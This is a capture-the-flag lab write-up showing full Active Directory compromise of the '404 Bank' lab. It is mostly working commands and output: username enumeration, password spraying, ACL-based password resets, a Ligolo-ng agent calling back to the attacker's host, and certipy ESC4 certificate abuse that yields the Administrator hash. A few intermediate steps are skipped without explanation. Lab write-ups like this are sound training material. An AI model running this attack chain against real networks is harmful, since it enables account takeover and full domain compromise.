Challenge Lab: 404 Bank is a medium-difficulty Hack Smarter Labs challenge. The attack path starts with username harvesting from a company website and reverse engineering a downloadable binary that leaks a base64-encoded MD5 hash. Cracking it and spraying confirms `karl.hackermann`. BloodHound maps a chain of ACL abuses across multiple accounts — GenericWrite for targeted Kerberoasting, ForceChangePassword hops, Recycle Bin email recovery leaking credentials, an internal web service behind Ligolo-ng revealing a password-protected zip crackable via a CeWL wordlist, and finally ADCS ESC4 to compromise the domain.

## Web Enumeration — Username Harvesting & Binary Analysis

Port 80 serves a static page for 404 Finance:

![web-index](/assets/img/404bank/web-index.png)

The "Meet Our Team" section lists staff names — potential usernames. The `/services.html` page offers a downloadable executable:

![services-page](/assets/img/404bank/services-page.png)

Generate username variants with `username-anarchy`:

```bash
ruby ~/Desktop/tools/username-anarchy/username-anarchy -i tmp -f flast,f.last,first.last > users.txt
```

Validate against Kerberos to confirm the domain's accepted format:

```bash
kerbrute userenum -d 404finance.local --dc 10.1.235.101 users.txt
```

```text
2026/03/27 03:44:19 >  [+] VALID USERNAME:       karl.hackermann@404finance.local
2026/03/27 03:44:19 >  [+] VALID USERNAME:       robert.graef@404finance.local
```

![kerbrute-users](/assets/img/404bank/kerbrute-users.png)

Two valid users from the three names on the page. Now look at the downloaded binary:

```bash
file CorpBankDialer.exe
```

```text
CorpBankDialer.exe: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, not stripped
```

Running `file` against the exe reveals it's actually a Linux ELF binary. Before pulling it into Ghidra, we run `strings` first:

```bash
strings CorpBankDialer.exe
```

```text
Welcome to CorpBank SecureAccess v3.7.2\n
DEBUG: ZGQyZWYzNDUzMGRlN2U1YmVmMjJhMDVlN2U1ZGQxNzg=\n
```

![strings-output](/assets/img/404bank/strings-output.png)

A base64-encoded debug string left in the binary. Decode it:

```bash
echo -n 'ZGQyZWYzNDUzMGRlN2U1YmVmMjJhMDVlN2U1ZGQxNzg=' | base64 -d
```

```text
dd2ef34530de7e5bef22a05e7e5dd178
```

32 hex characters — MD5 hash. Crack it via CrackStation:

![crackstation](/assets/img/404bank/crackstation.png)

`dd2ef34530de7e5bef22a05e7e5dd178:Password123!!`

Spray it across the confirmed usernames:

```bash
nxc smb 10.1.235.101 -u users.txt -p 'Password123!!' --continue
```

```text
SMB  10.1.235.101  445  DC-404  [+] 404finance.local\karl.hackermann:Password123!!
SMB  10.1.235.101  445  DC-404  [-] 404finance.local\robert.graef:Password123!! ST
```

![spray-hit](/assets/img/404bank/spray-hit.png)

Credentials: `karl.hackermann:Password123!!`

## SMB Enumeration & BloodHound

```bash
nxc smb 10.1.235.101 -u karl.hackermann -p 'Password123!!' --shares
```

```text
SMB  10.1.235.101  445  DC-404  IPC$     READ  Remote IPC
SMB  10.1.235.101  445  DC-404  NETLOGON READ  Logon server share
SMB  10.1.235.101  445  DC-404  SYSVOL   READ  Logon server share
```

![smb-shares](/assets/img/404bank/smb-shares.png)

Nothing interesting — just standard shares. Let's do BloodHound:

```bash
rusthound-ce -d 404finance.local -u karl.hackermann -p 'Password123!!' -c All --zip
```

BloodHound reveals an attack chain:

```text
[KARL.HACKERMANN] --GenericWrite--> [TOM.REBOOT] --ForceChangePassword--> [ROBERT.GRAEF]
```

![bloodhound-chain](/assets/img/404bank/bloodhound-chain.png)

`karl.hackermann` has `GenericWrite` over `tom.reboot`, and `tom.reboot` has `ForceChangePassword` over `robert.graef` — a two-hop chain to reset Robert's password. `GenericWrite` means we can set an SPN on `tom.reboot` and Kerberoast him to get his credentials first.

## ACL Chain — tom.reboot → robert.graef → jan.tresor

`tom.reboot` has `ForceChangePassword` over `robert.graef`. Reset Robert's password:

```bash
bloodyAD --host 404finance.local -u 'TOM.REBOOT' -p 'P@ssw0rd123' set password ROBERT.GRAEF Password1
```

```text
[+] Password changed successfully!
```

BloodHound shows Robert's full edge set:

```text
                    ForceChangePassword --> [MELANIE.KUNZ]
                    ForceChangePassword --> [JAN.TRESOR]
[ROBERT.GRAEF] ---> ForceChangePassword --> [NINA.INKASSO]
                    AddMember -----------> [REMOTE DESKTOP USERS]
```

![bloodhound-robert](/assets/img/404bank/bloodhound-robert.png)

Add Robert to `REMOTE DESKTOP USERS` and RDP in:

```bash
bloodyAD --host 404finance.local -u ROBERT.GRAEF -p 'Password1' add groupMember 'REMOTE DESKTOP USERS' ROBERT.GRAEF
```

```text
[+] ROBERT.GRAEF added to REMOTE DESKTOP USERS
```

Inside the RDP session, `C:\Users` shows six profiles. `jan.tresor` stands out — Robert has `ForceChangePassword` over her too. Reset and RDP in as Jan:

![users-dir](/assets/img/404bank/users-dir.png)

```bash
bloodyAD --host 404finance.local -u ROBERT.GRAEF -p 'Password1' set password JAN.TRESOR Password1
bloodyAD --host 404finance.local -u ROBERT.GRAEF -p 'Password1' add groupMember 'REMOTE DESKTOP USERS' JAN.TRESOR
```

## Internal Web Service — Port 5000

As `webadmin`, `C:\inetpub\wwwroot` contains two folders — `Port80` and `Port5000`:

![inetpub-dirs](/assets/img/404bank/inetpub-dirs.png)

Confirm port 5000 is listening locally:

```powershell
netstat -ano | findstr 5000
```

```text
TCP    0.0.0.0:5000    0.0.0.0:0    LISTENING    4
```

Stand up Ligolo-ng to reach it:

```bash
ligolo-ng » ifcreate --name ligolo
ligolo-ng » route_add --name ligolo --route 240.0.0.1/32
```

```text
evil-winrm-py PS C:\programdata> .\agent.exe -connect 10.200.42.41:11601 -ignore-cert
```

```bash
[Agent : FINANCE404\daniel.hoffmann@DC-404] » start
```

`http://240.0.0.1:5000` presents an HTTP Basic Auth prompt:

![port5000-auth](/assets/img/404bank/port5000-auth.png)

The internal admin dashboard has a download link for `config_backup.zip`:

![port5000-dashboard](/assets/img/404bank/port5000-dashboard.png)

We downloaded the zip and found it is password protected:

```bash
7z x config_backup.zip
```

![zip-protected](/assets/img/404bank/zip-protected.png)

Extracting the hash from the zip:

```bash
zip2john config_backup.zip > hash.txt
```

First attempt with rockyou came up empty. Remembering the security team's hint about the bank's history, we ran CeWL against port 80 to build a custom wordlist:

```text
Sensitive data such as archives are protected with strong passwords. We recommend using passwords inspired by the unique history of our bank — standard wordlists like rockyou.txt won't stand a chance.
```

![cewl-hint](/assets/img/404bank/cewl-hint.png)

```bash
cewl http://240.0.0.1 | grep -v CeWL > wordlists.txt
```

```bash
john hash.txt --wordlist=wordlists.txt
```

```text
DontmessWithTexas (config_backup.zip/config.dat)
```

Extracting the zip revealed `config.dat` containing plaintext credentials for `svc.services`:

```bash
cat config.dat
```

```text
# Configuration Backup - Do not delete!
[ServiceUser]
username = svc.services
password = S3rv1cePower2024!
host = WIN-SRV01
autostart = true
```

## Privilege Escalation — ADCS ESC4

Switching back to Robert's session, we re-enabled the account:

```powershell
PS C:\Users\ROBERT.GRAEF> Enable-ADAccount -Identity svc.services
```

Running `certipy` to check for vulnerable templates:

```bash
certipy find -u svc.services -p 'S3rv1cePower2024!' -target DC-404.404finance.local -vuln -stdout
```

```text
Template Name   : Vuln-ESC4
Certificate CA  : 404finance-DC-404-CA
Vulnerability   : ESC4 - User has dangerous permissions.
```

![certipy-vuln](/assets/img/404bank/certipy-vuln.png)

Back up the template config, then overwrite it to make it vulnerable to ESC1:

```bash
certipy template -u svc.services@404finance.local -p 'S3rv1cePower2024!' -target DC-404.404finance.local -template Vuln-ESC4 -save-configuration 404bank.json

certipy template -u svc.services@404finance.local -p 'S3rv1cePower2024!' -target DC-404.404finance.local -template Vuln-ESC4 -write-default-configuration -force
```

![certipy-template](/assets/img/404bank/certipy-template.png)

Request a certificate with the Administrator UPN:

```bash
certipy req -u svc.services@404finance.local -p 'S3rv1cePower2024!' -target DC-404.404finance.local -ca 404finance-DC-404-CA -template Vuln-ESC4 -upn administrator@404finance.local
```

```text
[*] Got certificate with UPN 'administrator@404finance.local'
[*] Saving certificate and private key to 'administrator.pfx'
```

![certipy-req](/assets/img/404bank/certipy-req.png)

Authenticate with the certificate:

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.1.235.101
```

```text
[*] Got hash for 'administrator@404finance.local': aad3b435b51404eeaad3b435b51404ee:a6019e48da8f602a60c30a6f0136d792
```

![certipy-auth](/assets/img/404bank/certipy-auth.png)

Domain fully compromised.
